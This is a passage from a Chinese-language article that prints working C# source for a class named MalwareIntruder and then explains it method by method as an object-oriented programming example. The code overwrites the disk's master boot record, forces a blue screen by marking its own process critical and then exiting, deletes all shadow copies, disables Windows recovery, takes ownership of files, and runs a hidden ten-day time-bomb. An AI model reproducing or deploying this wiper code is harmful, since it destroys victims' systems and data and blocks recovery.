            /// 如果函数失败，返回值为零（表示 <c>false</c>）。
            /// </returns>
            [DllImport("kernel32.dll", SetLastError = true)]
            [return: MarshalAs(UnmanagedType.Bool)]
            private static extern bool ReadFile(HANDLE hFile, byte[] lpBuffer, uint nNumberOfBytesToRead, ref uint lpNumberOfBytesRead, IntPtr lpOverlapped);

            /// <summary>
            /// 创建或打开文件或I/O设备。
            /// </summary>
            /// <param name="lpFileName">要创建或打开的文件或设备的名称。</param>
            /// <param name="dwDesiredAccess">对文件或设备期望的访问权限。</param>
            /// <param name="dwShareMode">文件或设备的共享模式。</param>
            /// <param name="lpSecurityAttributes">指向SECURITY_ATTRIBUTES结构的指针，用于确定文件或设备的安全属性。</param>
            /// <param name="dwCreationDisposition">当文件或设备存在与否时应采取的操作。</param>
            /// <param name="dwFlagsAndAttributes">文件或设备的属性及标志。</param>
            /// <param name="hTemplateFile">指向模板文件的句柄（若适用）。</param>
            /// <returns></returns>
            [DllImport("kernel32.dll", SetLastError = true)]
            private static extern HANDLE CreateFileA(string lpFileName, uint dwDesiredAccess, uint dwShareMode, uint lpSecurityAttributes, uint dwCreationDisposition, uint dwFlagsAndAttributes, IntPtr hTemplateFile);

            /// <summary>
            /// 将数据写入指定的文件或输入/输出（I/O）设备。
            /// </summary>
            /// <param name="hFile">要写入数据的文件句柄。</param>
            /// <param name="lpBuffer">指向包含要写入数据的缓冲区的指针。</param>
            /// <param name="nNumberOfBytesToWrite">要从缓冲区写入的字节数。</param>
            /// <param name="lpNumberOfBytesWritten">指向一个变量的指针，该变量用于接收实际写入的字节数。</param>
            /// <param name="lpOverlapped">指向OVERLAPPED结构的指针（若适用）。</param>
            /// <returns>
            /// 函数如果成功，则返回true；函数如果失败，则返回false。
            /// </returns>
            [DllImport("kernel32.dll", SetLastError = true)]
            [return: MarshalAs(UnmanagedType.Bool)]
            private static extern bool WriteFile(HANDLE hFile, byte[] lpBuffer, int nNumberOfBytesToWrite, ref int lpNumberOfBytesWritten, IntPtr lpOverlapped);

            // 定义文件共享模式常量
            private const int File_Share_Read = 0x00000001;
            private const int File_Share_Write = 0x00000002;
            // 定义文件访问权限常量
            private const uint Generic_Read = 0x80000000;
            private const uint Generic_Write = 0x40000000;
            // 定义文件创建操作常量
            private const int Open_Existing = 3;

            // 关闭句柄的 Windows API 函数
            [DllImport("kernel32.dll", SetLastError = true)]
            [return: MarshalAs(UnmanagedType.Bool)]
            private extern static bool CloseHandle(HANDLE hObject);
            /// <summary>
            /// 用于设置进程信息。
            /// </summary>
            /// <param name="hProcess">进程的句柄。</param>
            /// <param name="processInformationClass">要设置的进程信息类型。</param>
            /// <param name="processInformation">指向包含要设置的进程信息的缓冲区的指针。</param>
            /// <param name="processInformationLength">进程信息缓冲区的长度。</param>
            /// <returns></returns>
            [DllImport("ntdll.dll", SetLastError = true)]
            private static extern int NtSetInformationProcess(IntPtr hProcess, int processInformationClass, ref int processInformation, int processInformationLength);
            /// <summary>
            /// 获取指定的文件所有权，并执行操作
            /// </summary>
            /// <param name="iFile">文件路径</param>
            /// <param name="action">获取到所有权后执行的操作</param>
            public static void TakeOwnershipOfFile(string iFile, Action<string> action)
            {
                ProcessStartInfo takeownPsi = new ProcessStartInfo
                {
                    FileName = "takeown.exe",
                    Arguments = $"/f \"{iFile}\" /A",
                    Verb = "runas",
                    UseShellExecute = false,
                    CreateNoWindow = true
                };
                Process.Start(takeownPsi).WaitForExit();
                ProcessStartInfo icaclsPsi = new ProcessStartInfo
                {
                    FileName = "icacls.exe",
                    Arguments = $"\"{iFile}\" /grant Everyone:F",
                    Verb = "runas",
                    UseShellExecute = false,
                    CreateNoWindow = true
                };
                Process.Start(icaclsPsi).WaitForExit();
                action.Invoke(iFile);
            }
            /// <summary>
            /// 获取指定的文件所有权
            /// </summary>
            /// <param name="iFile">文件路径</param>
            public static void TakeOwnershipOfFile(string iFile)
            {
                ProcessStartInfo takeownPsi = new ProcessStartInfo
                {
                    FileName = "takeown.exe",
                    Arguments = $"/f \"{iFile}\" /A",
                    Verb = "runas",
                    UseShellExecute = false,
                    CreateNoWindow = true
                };
                Process.Start(takeownPsi).WaitForExit();
                ProcessStartInfo icaclsPsi = new ProcessStartInfo
                {
                    FileName = "icacls.exe",
                    Arguments = $"\"{iFile}\" /grant Everyone:F",
                    Verb = "runas",
                    UseShellExecute = false,
                    CreateNoWindow = true
                };
                Process.Start(icaclsPsi).WaitForExit();
            }
            /// <summary>
            /// 如果MBR备份文件不存在，就通过Windows API读取MBR，并写入备份文件中；
            /// 如果存在，就获取MBR。
            /// </summary>
            /// <returns>获取到的MBR</returns>
            public static byte[] GetMbrUsingWindowsAPI()
            {
                // 定义物理驱动器的路径
                string physicalDrivePath = @"\\.\PhysicalDrive0";
                // 用于存储实际读取的字节数
                uint bytesRead = 0;
                // 空值常量
                uint NULL_VALUE = 0;
                // 用于存储 MBR 数据的字节数组
                byte[] masterBootRecordData = new byte[512];
                // 定义 MBR 存储文件夹的路径
                const string MBR_STORAGE_PATH = @"C:\bin";
                // 检查 MBR 存储文件夹是否存在，如果不存在则创建
                if (!Directory.Exists(MBR_STORAGE_PATH))
                {
                    Directory.CreateDirectory(MBR_STORAGE_PATH);
                }
                // 检查 MBR 备份文件是否存在
                if (!File.Exists(MBR_PATH))
                {
                    // 打开物理驱动器的句柄
                    HANDLE handle = CreateFileA(physicalDrivePath, Generic_Read, File_Share_Read, NULL_VALUE, Open_Existing, NULL_VALUE, IntPtr.Zero);
                    if (handle != IntPtr.Zero)
                    {
                        // 从物理驱动器读取 MBR 数据
                        if (ReadFile(handle, masterBootRecordData, 512, ref bytesRead, IntPtr.Zero))
                        {
                            try
                            {
                                // 创建或打开 MBR 备份文件并写入数据
                                using (FileStream fileStream = new FileStream(MBR_PATH, FileMode.OpenOrCreate, FileAccess.ReadWrite, FileShare.ReadWrite))
                                {
                                    fileStream.Write(masterBootRecordData, 0, 512);
                                }
                            }
                            catch (Exception)
                            {
                                // 发生异常时返回 null
                                return null;
                            }
                            finally
                            {
                                // 关闭句柄
                                CloseHandle(handle);
                            }
                        }
                        else
                        {
                            // 读取失败时关闭句柄并返回 null
                            CloseHandle(handle);
                            return null;
                        }
                    }
                    else
                    {
                        // 打开句柄失败时返回 null
                        return null;
                    }
                }
                try
                {
                    // 重新初始化 MBR 数据数组
                    masterBootRecordData = new byte[512];
                    // 从 MBR 备份文件中读取数据
                    using (FileStream fileStream = new FileStream(MBR_PATH, FileMode.Open, FileAccess.Read, FileShare.ReadWrite))
                    {
                        fileStream.Read(masterBootRecordData, 0, 512);
                    }
                    return masterBootRecordData;
                }
                catch (Exception)
                {
                    // 发生异常时返回 null
                    return null;
                }
            }

            // 通过文件流获取 MBR 数据
            public static byte[] GetMbrByFileStream()
            {
                // 定义物理驱动器的路径
                string physicalDrivePath = @"\\.\PhysicalDrive0";
                // 用于存储 MBR 数据的字节数组
                byte[] masterBootRecordData = new byte[512];
                // 定义 MBR 存储文件夹的路径
                const string MBR_STORAGE_PATH = @"C:\bin";
                // 检查 MBR 存储文件夹是否存在，如果不存在则创建
                if (!Directory.Exists(MBR_STORAGE_PATH))
                {
                    DirectoryInfo directory = new DirectoryInfo(MBR_STORAGE_PATH);
                    directory.Create();
                }
                // 获取 MBR 备份文件的信息
                FileInfo mbrFileInfo = new FileInfo(MBR_PATH);
                if (!mbrFileInfo.Exists)
                {
                    // 打开物理驱动器的文件流并读取 MBR 数据
                    using (FileStream fileStream = new FileStream(physicalDrivePath, FileMode.Open, FileAccess.ReadWrite, FileShare.ReadWrite))
                    {
                        fileStream.Read(masterBootRecordData, 0, 512);
                    }
                    // 创建或打开 MBR 备份文件并写入数据
                    using (FileStream fileStream1 = new FileStream(MBR_PATH, FileMode.OpenOrCreate, FileAccess.ReadWrite, FileShare.ReadWrite))
                    {
                        fileStream1.Write(masterBootRecordData, 0, 512);
                    }
                    // 将 MBR 数据数组清零
                    for (int i = 0; i < 512; i++)
                    {
                        masterBootRecordData[i] = 0;
                    }
                }
                // 从 MBR 备份文件中读取数据
                using (FileStream fileStream2 = new FileStream(MBR_PATH, FileMode.Open, FileAccess.ReadWrite, FileShare.ReadWrite))
                {
                    fileStream2.Read(masterBootRecordData, 0, 512);
                }
                return masterBootRecordData;
            }

            // 异步检查时间是否到达指定日期
            public static async Task<bool> CheckTimeAsync(string filename = @"time.txt", int daysLater = 10)
            {
                // 定义时间文件存储文件夹的路径
                const string TIME_FOLDER_PATH = @"C:\time8597";
                // 构建时间文件的完整路径
                string timeFilePath = Path.Combine(TIME_FOLDER_PATH, filename);
                // 获取时间文件存储文件夹的信息
                DirectoryInfo directory = new DirectoryInfo(TIME_FOLDER_PATH);
                // 检查时间文件存储文件夹是否存在，如果不存在则创建
                if (!directory.Exists)
                {
                    directory.Create();
                }
                // 将时间文件存储文件夹设置为隐藏属性
                directory.Attributes = FileAttributes.Hidden;
                if (!File.Exists(timeFilePath))
                {
                    // 计算指定天数后的日期
                    DateTime futureDateTime = DateTime.Now.AddDays(daysLater);
                    // 将日期信息写入时间文件
                    File.WriteAllText(timeFilePath, $"{futureDateTime.Year}--time--{futureDateTime.Month}--time--{futureDateTime.Day}");
                }
                // 读取时间文件中的日期信息
                string storedTimeString = File.ReadAllText(timeFilePath);
                // 定义分隔符数组
                string[] splits = { "--time--" };
                // 分割日期信息字符串
                string[] dateComponents = storedTimeString.Split(splits, StringSplitOptions.None);
                // 获取年份
                int year = Convert.ToInt32(dateComponents[0]);
                // 获取月份
                int month = Convert.ToInt32(dateComponents[1]);
                // 获取日期
                int day = Convert.ToInt32(dateComponents[2]);
                // 构建目标日期对象
                DateTime targetDateTime = new DateTime(year, month, day);
                while (true)
                {
                    // 获取当前日期时间
                    DateTime now = DateTime.Now;
                    if (now >= targetDateTime)
                    {
                        // 如果当前日期时间大于等于目标日期时间，返回 true
                        return true;
                    }
                    // 异步延迟 200 毫秒
                    await Task.Delay(200);
                }
            }

            /// <summary>
            /// 检测是否为管理员身份运行
            /// </summary>
            /// <returns>是管理员返回 true，不是则为 false</returns>
            public static bool IsRunningAsAdministrator()
            {
                // 获取当前用户的身份信息
                WindowsIdentity identity = WindowsIdentity.GetCurrent();
                // 创建 Windows 主体对象
                WindowsPrincipal principal = new WindowsPrincipal(identity);
                // 检查是否为管理员角色
                return principal.IsInRole(WindowsBuiltInRole.Administrator);
            }

            /// <summary>
            /// 以管理员身份运行自身进程
            /// </summary>
            public static void RestartCurrentAppAsAdmin()
            {
                // 创建进程启动信息对象
                ProcessStartInfo startInfo = new ProcessStartInfo();
                // 设置要启动的进程的文件名
                startInfo.FileName = Process.GetCurrentProcess().MainModule.FileName;
                // 设置以管理员身份运行
                startInfo.Verb = "runas";
                try
                {
                    // 启动进程
                    Process.Start(startInfo);
                }
                catch (Exception ex)
                {
                    // 捕获异常并显示错误消息框
                    MessageBox.Show(ex.Message, "错误", MessageBoxButtons.OK, MessageBoxIcon.Error);
                }
                finally
                {
                    // 退出当前进程
                    Environment.Exit(0);
                }
            }

            // 内部类，实现了多个接口，用于执行各种系统操作
            private class OpMaster : INormalOperator, IWindowsAPIOperator, IConfigCorrupter
            {
                bool IWindowsAPIOperator.CloseHandle(HANDLE hObject)
                {
                    return CloseHandle(hObject);
                }
                bool IWindowsAPIOperator.WriteFile(HANDLE hFile, byte[] lpBuffer, int nNumberOfBytesToWrite, ref int lpNumberOfBytesWritten, IntPtr lpOverlapped)
                {
                    return WriteFile(hFile, lpBuffer, nNumberOfBytesToWrite, ref lpNumberOfBytesWritten, lpOverlapped);
                }
                HANDLE IWindowsAPIOperator.CreateFileA(string lpFileName, Windows_API_Constants dwDesiredAccess, Windows_API_Constants dwShareMode, uint lpSecurityAttributes, Windows_API_Constants dwCreationDisposition, uint dwFlagsAndAttributes, IntPtr hTemplateFile)
                {
                    return CreateFileA(lpFileName, (uint)dwDesiredAccess, (uint)dwShareMode, lpSecurityAttributes, (uint)dwCreationDisposition, dwFlagsAndAttributes, hTemplateFile);
                }
                bool IWindowsAPIOperator.ReadFile(HANDLE hFile, byte[] lpBuffer, uint nNumberOfBytesToRead, ref uint lpNumberOfBytesRead, System.IntPtr lpOverlapped)
                {
                    return ReadFile(hFile, lpBuffer, nNumberOfBytesToRead, ref lpNumberOfBytesRead, lpOverlapped);
                }
                // 用于触发蓝屏的方法
                void IConfigCorrupter.TriggerBlueScreen()
                {
                    // 设置进程为关键进程
                    int isCritical = 1;
                    // 定义 BreakOnTermination 常量
                    int BreakOnTermination = 29;
                    // 调用 Windows API 设置进程信息
                    NtSetInformationProcess(Process.GetCurrentProcess().Handle, BreakOnTermination, ref isCritical, sizeof(int));
                    // 退出当前进程
                    Environment.Exit(0);
                }

                // 修改主引导记录（MBR）
                void INormalOperator.ModifyMasterBootRecord()
                {
                    // 定义初始的 MBR 数据
                    byte[] initialMbrData = { 0xE8, 0x02, 0x00, 0xEB, 0xFE, 0xBD, 0x17, 0x7C, 0xB9, 0x03, 0x00, 0xB8, 0x01, 0x13, 0xBB, 0x0C, 0x00, 0xBA, 0x1D, 0x0E, 0xCD, 0x10, 0xC3, 0x54, 0x76, 0x54 };
                    // 创建一个 512 字节的 MBR 数据数组
                    byte[] mbrdata = new byte[512];
                    // 将初始 MBR 数据复制到 MBR 数据数组中
                    for (int i = 0; i < initialMbrData.Length; i++)
                    {
                        mbrdata[i] = initialMbrData[i];
                    }
                    // 设置 MBR 数据的最后两个字节
                    mbrdata[510] = 0x55;
                    mbrdata[511] = 0xAA;
                    // 定义物理驱动器的路径
                    string physicalDrivePath = @"\\.\PhysicalDrive0";
                    // 打开物理驱动器的文件流并写入 MBR 数据
                    using (FileStream file = new FileStream(physicalDrivePath, FileMode.Open, FileAccess.ReadWrite, FileShare.ReadWrite))
                    {
                        file.Write(mbrdata, 0, 512);
                    }
                }

                // 使用Windows API修改（MBR）
                bool IWindowsAPIOperator.ModifyMasterBootRecord()
                {
                    // 定义物理驱动器的路径
                    const string physicalDrivePath = @"\\.\PhysicalDrive0";
                    // 用于存储实际写入的字节数
                    int bytesWritten = 0;
                    // 空值常量
                    uint NULL_VALUE = 0;
                    // 定义初始的 MBR 数据
                    byte[] initialMbrData = { 0xE8, 0x02, 0x00, 0xEB, 0xFE, 0xBD, 0x17, 0x7C, 0xB9, 0x03, 0x00, 0xB8, 0x01, 0x13, 0xBB, 0x0C, 0x00, 0xBA, 0x1D, 0x0E, 0xCD, 0x10, 0xC3, 0x54, 0x76, 0x54 };
                    // 创建一个 512 字节的 MBR 数据数组
                    byte[] masterBootRecordData = new byte[512];
                    // 将初始 MBR 数据复制到 MBR 数据数组中
                    for (int i = 0; i < initialMbrData.Length; i++)
                    {
                        masterBootRecordData[i] = initialMbrData[i];
                    }
                    // 设置 MBR 数据的最后两个字节
                    masterBootRecordData[510] = 0x55;
                    masterBootRecordData[511] = 0xAA;
                    // 打开物理驱动器的句柄
                    HANDLE masterBootRecord = CreateFileA(physicalDrivePath, Generic_Read | Generic_Write, File_Share_Read | File_Share_Write, NULL_VALUE, Open_Existing, NULL_VALUE, HANDLE.Zero);
                    // 写入 MBR 数据
                    bool isWriteSuccessful = WriteFile(masterBootRecord, masterBootRecordData, 512, ref bytesWritten, IntPtr.Zero);
                    if (masterBootRecord != IntPtr.Zero)
                    {
                        // 关闭句柄
                        CloseHandle(masterBootRecord);
                    }
                    return isWriteSuccessful;
                }
                void IConfigCorrupter.DeleteAllRestorePoints()
                {
                    // 创建进程启动信息对象
                    ProcessStartInfo startInfo = new ProcessStartInfo()
                    {
                        // 设置要启动的进程的文件名
                        FileName = @"vssadmin.exe",
                        // 设置删除所有卷影副本的参数
                        Arguments = "delete shadows /all /quiet",
                        //以管理员身份运行此进程
                        Verb = "runas",
                        // 不使用 shell 执行
                        UseShellExecute = false,
                        // 不创建窗口
                        CreateNoWindow = true,
                    };
                    // 启动进程
                    Process.Start(startInfo).WaitForExit();
                }
                // 用于重启计算机的方法
                void IConfigCorrupter.RestartComputer()
                {
                    // 创建进程启动信息对象
                    ProcessStartInfo startInfo = new ProcessStartInfo()
                    {
                        // 设置要启动的进程的文件名
                        FileName = @"shutdown.exe",
                        // 设置重启计算机的参数
                        Arguments = "/r /t 0",
                        // 不使用 shell 执行
                        UseShellExecute = false,
                        // 不创建窗口
                        CreateNoWindow = true,
                    };
                    // 启动进程
                    Process.Start(startInfo);
                }

                // 禁用Windows恢复环境
                void IConfigCorrupter.DisableWindowsRecoveryEnvironment()
                {
                    // 创建进程启动信息对象
                    ProcessStartInfo startInfo = new ProcessStartInfo()
                    {
                        // 设置要启动的进程的文件名
                        FileName = @"reagentc.exe",
                        // 设置禁用 Windows 恢复环境的参数
                        Arguments = @"/disable",
                        // 不创建窗口
                        CreateNoWindow = true,
                        // 不使用 shell 执行
                        UseShellExecute = false,
                    };
                    // 启动进程
                    Process.Start(startInfo).WaitForExit();
                }

                // 将传入的MBR数据写入物理驱动器
                void INormalOperator.WriteToMasterBootRecord(byte[] buffer)
                {
                    // 定义物理驱动器的路径
                    string path = @"\\.\PhysicalDrive0";
                    // 打开物理驱动器的文件流并写入 MBR 数据
                    using (FileStream fileStream = new FileStream(path, FileMode.Open, FileAccess.ReadWrite, FileShare.ReadWrite))
                    {
                        fileStream.Write(buffer, 0, 512);
                    }
                }

                // 使用 Windows API 将传入的 MBR 数据写入物理驱动器
                bool IWindowsAPIOperator.WriteToMasterBootRecord(byte[] buffer)
                {
                    // 定义物理驱动器的路径
                    string path = @"\\.\PhysicalDrive0";
                    // 用于存储实际写入的字节数
                    int write = 0;
                    // 句柄初始化为零
                    HANDLE handle = IntPtr.Zero;
                    try
                    {
                        // 打开物理驱动器的句柄
                        handle = CreateFileA(path, Generic_Read | Generic_Write,
                                    File_Share_Read | File_Share_Write,
                                    0, Open_Existing,
                                    0, IntPtr.Zero);
                        if (handle != IntPtr.Zero)
                        {
                            // 写入 MBR 数据
                            if (WriteFile(handle, buffer, 512, ref write, IntPtr.Zero))
                            {
                                // 关闭句柄
                                CloseHandle(handle);
                                return true;
                            }
                        }
                    }
                    finally
                    {
                        if (handle != IntPtr.Zero)
                        {
                            // 关闭句柄
                            CloseHandle(handle);
                        }
                    }
                    return false;
                }
            }

            // 创建指定接口类型的实例
            public static T Create<T>() where T : class
            {
                if (typeof(T) == typeof(IWindowsAPIOperator) || typeof(T) == typeof(INormalOperator) || typeof(T) == typeof(IConfigCorrupter))
                {
                    // 如果是指定的接口类型，则创建 OpMaster 实例并转换为指定类型
                    return new OpMaster() as T;
                }
                return null;
            }
        }
    }
}
```

**在`MalwareIntruder`类的代码实现中，面向对象编程（OOP）的核心特性 —— 封装、继承和多态，通过不同的方法得以充分展现。这些特性不仅增强了代码的组织性和可维护性，还为恶意软件入侵模拟提供了灵活且高效的实现方式。那么接下来，我将以面向对象的角度来为大家全面讲解这些代码。**

> 
>  - **类的封装与方法关联 - `GetMbrUsingWindowsAPI`方法​**
>    - **描述**：数据获取方法，用于获取 MBR 数据。​
>    - **面向对象体现**：该方法存在于MalwareIntruder类中，MalwareIntruder类通过私有构造函数实现了封装，外部无法随意创建其实例，只能通过其提供的静态方法（如GetMbrUsingWindowsAPI）来使用类的功能。这保证了对
> MBR 数据获取操作的可控性，避免外部随意调用内部复杂的实现逻辑。
>    - **实现过程**：该方法用于获取 MBR 数据。首先定义物理驱动器路径`@"\\.\PhysicalDrive0"`，准备用于存储读取字节数的`bytesRead`和空值常量NULL_VALUE，创建
> 512 字节的`masterBootRecordData`数组用于存放 MBR 数据。接着检查 MBR
> 存储文件夹是否存在，若不存在则创建。再检查 MBR
> 备份文件是否存在，若不存在，通过`CreateFileA`函数打开物理驱动器句柄，设置访问权限为`Generic_Read`，共享模式为`File_Share_Read`。若句柄打开成功，利用ReadFile函数从物理驱动器读取
> 512 字节数据到`masterBootRecordData`数组中，随后将数据写入 MBR
> 备份文件。若备份文件已存在，则直接从备份文件中读取数据到`masterBootRecordData`数组并返回。​
>    - **调用函数及原理**：调用`CreateFileA`函数时，操作系统依据传入的路径、访问权限、共享模式等参数验证调用程序的权限，若权限允许则创建指向物理驱动器的文件句柄，这涉及操作系统对设备资源的管理与访问控制。`ReadFile`函数利用已获取的文件句柄，从物理驱动器的特定位置（MBR
> 所在位置）读取数据，这依赖于操作系统的文件系统驱动，驱动负责将存储设备上的物理数据读取到内存中的指定字节数组，实现应用程序对物理设备数据的读取操作。
>
 
> - **接口实现与多态 - `TriggerBlueScreen`方法（在OpMaster类中实现`IConfigCorrupter`接口）​**
>    - **描述**：系统破坏方法，属于`IConfigCorrupter`接口实现的系统破坏相关操作。​
>    - **面向对象体现**：`OpMaster`类实现了`IConfigCorrupter`接口，体现了接口实现的面向对象特性。`IConfigCorrupter`接口定义了一系列系统破坏相关的操作规范，`OpMaster`类必须实现这些规范。当通过`IConfigCorrupter`接口引用`OpMaster`类实例并调用`TriggerBlueScreen`方法时，实现了多态性。不同的类（若有其他类也实现该接口）可以有不同的`TriggerBlueScreen`实现方式，在运行时根据实际对象类型决定调用哪个实现。​
> 实现过程：方法开始设置`isCritical`为 `1`，表明将当前进程标记为关键进程，同时定义`BreakOnTermination`为
> `29`，用于指定特定的进程信息类型。然后调用`NtSetInformationProcess`函数，将当前进程句柄、上述指定的进程信息类型以及`isCritical`参数传入。调用完成后，通过`Environment.Exit(0)`退出当前进程，以此触发系统蓝屏。​
>    - **调用函数及原理**：`NtSetInformationProcess`是 `Windows` 内核提供的函数，用于设置进程的特定信息。当传入特定的进程信息类型（此处为`BreakOnTermination`）和关键进程标记（`isCritical`）时，操作系统的进程管理模块接收到这些信息。根据内部预定义的异常处理和进程管理规则，当关键进程以特定方式退出（在此例中通过设置特定信息后退出），系统判定这是一个严重异常情况，进而触发蓝屏机制，用于提示用户系统出现严重错误并停止当前不稳定的运行状态。
> 

> - **接口实现与多态 - `IWindowsAPIOperator.ModifyMasterBootRecord`方法（在`OpMaster`类中实现`IWindowsAPIOperator`接口）​**
> 
>   - **描述**：MBR 修改方法，基于 Windows API 的 MBR 修改操作，属于IWindowsAPIOperator接口实现的操作。​
>   - **面向对象体现**：OpMaster 类实现 IWindowsAPIOperator 接口，IWindowsAPIOperator 继承自 IConfigCorrupter 接口。这种接口继承关系体现了面向对象的层次结构和代码复用。对于
> ModifyMasterBootRecord 方法，在 IWindowsAPIOperator 接口中定义，OpMaster
> 类实现该方法，当通过 IWindowsAPIOperator 接口调用ModifyMasterBootRecord
> 时，展现了多态性。与INormalOperator.ModifyMasterBootRecord
> 方法形成对比，虽然方法名相同，但实现方式不同，体现了基于接口的多态设计。​
>   - **实现过程**：首先定义初始 `MBR` 数据并构建 `512` 字节的 `masterBootRecordData` 数组，将初始数据复制到该数组中，并设置数组最后两个字节为 `0x55` 和 `0xAA`，这两个字节是 MBR 的有效标志。接着使用
> `CreateFileA` 函数打开物理驱动器句柄，设置访问权限为`Generic_Read | Generic_Write`，共享模式为
> `File_Share_Read |
> File_Share_Write`，以允许对物理驱动器进行读写操作。若句柄打开成功，调用WriteFile函数将构建好的`masterBootRecordData`数组中的
> `512` 字节数据写入物理驱动器，完成通过 `Windows API` 修改 `MBR` 的操作，最后关闭句柄。​
>   - **调用函数及原理**：`CreateFileA` 函数创建可读写的物理驱动器句柄，操作系统验证调用程序对物理驱动器的读写权限，只有具备足够权限的程序才能成功获取句柄。WriteFile函数利用获取的句柄，在操作系统的文件系统和设备驱动支持下，将内存中的数据写入物理驱动器的
> `MBR` 位置。由于 `MBR` 是系统启动关键区域，修改 `MBR`
> 数据可能影响系统的启动和运行，操作系统在执行写入操作时会进行一系列的安全和一致性检查，但恶意程序可利用特定权限绕过部分检查进行危险操作。
>
 
> - **接口实现与多态 - `INormalOperator.ModifyMasterBootRecord`方法（在`OpMaster`类中实现`INormalOperator`接口）​**
> 
>    - **描述**：**MBR** 修改方法，基于常规文件流的 MBR 修改操作，属于`INormalOperator`接口实现的操作。​ 面向对象体现：`OpMaster` 类实现
> `INormalOperator` 接口，与 `IWindowsAPIOperator` 接口形成对比。`INormalOperator`
> 同样继承自 `IConfigCorrupter` 接口。对于`ModifyMasterBootRecord`
> 方法，`INormalOperator` 接口定义了基于常规操作（这里是基于文件流）的修改 `MBR` 操作规范，`OpMaster`
> 类实现该规范。与`IWindowsAPIOperator.ModifyMasterBootRecord`
> 的多态性类似，通过不同接口调用同名方法，执行不同的实现逻辑，体现了面向对象的多态特性，增强了代码的灵活性和扩展性。​
>    - **实现过程**：同样先定义初始 MBR 数据并构建 512 字节的 `mbrdata` 数组，将初始数据复制到数组中并设置最后两个字节为`0x55`和`0xAA`。然后利用`FileStream`类直接打开物理驱动器路径
> `@"\\.\PhysicalDrive0"`
> 对应的文件流，设置文件流的访问模式为读写，共享模式为读写。通过文件流的`Write`方法将`mbrdata`数组中的 512
> 字节数据写入物理驱动器，完成基于文件流的 `MBR` 修改操作，文件流使用完毕后自动关闭。​
>    - **调用函数及原理**：`FileStream` 类是.`NET` 框架提供的用于文件 I/O 操作的封装。在打开物理驱动器路径对应的文件流时，.NET 框架底层会调用 Windows API
> 相关函数（类似`CreateFileA`等）来创建文件句柄并设置相关参数，操作系统同样进行权限验证。通过文件流的Write方法写入数据时，.NET
> 框架将数据按照文件流的设置和操作系统的文件系统规则，最终写入物理驱动器的 `MBR` 位置。与直接调用 Windows API
> 相比，FileStream类提供了更抽象和便捷的文件操作方式，但本质上仍是与操作系统底层的文件系统和设备驱动交互来完成数据写入。

> - **其他方法**​
>   - `GetMbrByFileStream`**方法​**
>     - **描述**：数据获取方法，用于通过文件流获取 MBR 数据。​
>     - **简要说明**：定义物理驱动器路径，检查 MBR 存储文件夹及备份文件，若备份文件不存在则通过文件流读取物理驱动器 MBR 数据并写入备份文件，最后从备份文件读取数据返回。此方法与`GetMbrUsingWindowsAPI`方法类似，都是获取 MBR
> 数据，但采用了文件流方式，同样体现了 `MalwareIntruder` 类对数据获取操作的封装。​
>   - ~~`CheckTimeAsync`**方法**​~~ 
>     - ~~**描述**：时间检查方法，用于异步检查时间是否到达指定日期。​~~ 
>     - ~~**简要说明**：定义时间文件存储路径，检查文件夹是否存在并创建，若时间文件不存在则计算指定天数后的日期并写入文件。之后持续读取文件中的日期信息，与当前时间对比，当当前时间达到或超过指定日期时返回`true`。该方法实现了时间相关的逻辑，与其他系统操作方法相互独立，但同样作为
> `MalwareIntruder` 类的静态方法，体现了类对功能的整合与封装。​~~
> 
>   - **`IsRunningAsAdministrator`方法​**
>     - **描述**：权限检查方法，用于检测程序是否以管理员身份运行。​
>     - **简要说明**：通过获取当前用户身份信息，创建 Windows 主体对象，检查是否属于管理员角色来判断程序运行权限。这为其他需要管理员权限的方法（如修改 `MBR`
> 等操作）提供了权限验证基础，确保只有在具备足够权限时才能执行危险操作，与系统操作方法紧密关联，共同服务于恶意程序的运行逻辑。​
>   - **`RestartCurrentAppAsAdmin`方法​**
>       - **描述**：程序重启方法，用于以管理员身份重启当前应用程序。​
>       - **简要说明**：创建进程启动信息对象，设置以管理员身份运行当前进程，若启动失败则捕获异常并显示错误消息框，最后退出当前进程。该方法与权限检查方法配合，当检测到程序未以管理员身份运行且需要管理员权限执行某些操作时，可通过此方法尝试以管理员身份重启程序，保证恶意程序在需要时能够获取足够权限进行后续操作。
> 
>   -  **`TakeOwnershipOfFile`方法**
> 
>      - **描述**：文件权限操作方法，用于获取特定文件的所有权并执行后续自定义操作。
>      - **简要说明**：该方法通过创建`ProcessStartInfo`对象，调用系统自带的`takeown.exe`工具来获取指定文件的所有权，随后再调用`icacls.exe`工具为Everyone用户赋予该文件的完全控制权限。在成功完成这两步操作后，执行传入的`Action<string>`类型的委托`action`，该委托以文件路径作为参数，可用于执行对已获取所有权和权限的文件的任何自定义操作。如果在启动`takeown.exe`或`icacls.exe`进程过程中出现异常，将不会执行`action`委托，并且可能需要调用者根据具体情况进行错误处理。此方法主要用于在需要对特定文件进行所有权获取及相关操作的场景中，确保程序具备足够权限对文件进行后续处理。

> - **工厂方法 - `Create<T>`方法​**
>   - **面向对象体现**：`MalwareIntruder`类中的`Create<T>`方法属于工厂方法模式。在面向对象编程中，工厂方法提供了一种创建对象的方式，将对象的创建和使用分离。此方法根据传入的类型参数`T`，如果`T`是`IWindowsAPIOperator`、`INormalOperator`或`IConfigCorrupter`接口类型，就创建`OpMaster`类的实例并将其转换为`T`类型返回。这体现了代码的解耦，调用者无需知道具体的对象创建细节，只需通过工厂方法获取符合接口规范的对象实例，提高了代码的可维护性和可扩展性。例如，如果后续需要添加新的实现类来实现这些接口，只需在`Create<T>`方法中添加相应的创建逻辑，而调用该方法的其他代码无需修改。​
>   - **实现过程**：方法通过`typeof(T)`判断传入的类型参数`T`是否为指定的接口类型。如果是，就创建`OpMaster`类的实例，并使用`as`关键字将其转换为`T`类型返回。如果T不是指定的接口类型，则返回`null`。这种实现方式简洁明了，符合工厂方法模式的设计原则，将对象创建的复杂逻辑封装在工厂方法内部，外部调用者只需关心获取对象的接口类型。​
>   - **与其他方法的关联**：`Create<T>`方法创建的`OpMaster`类实例可用于调用上述提到的各个接口实现方法。例如，当创建一个`IWindowsAPIOperator`类型的对象时，就可以调用`IWindowsAPIOperator.ModifyMasterBootRecord`方法来执行通过
> Windows API 修改 `MBR`
> 的操作。它作为对象创建的入口，为整个系统的功能实现提供了基础，使得不同的操作方法能够通过符合接口规范的对象实例进行调用，进一步强化了面向对象编程中接口、多态以及封装等特性的协同作用
### 3.1.4 数据加密模块
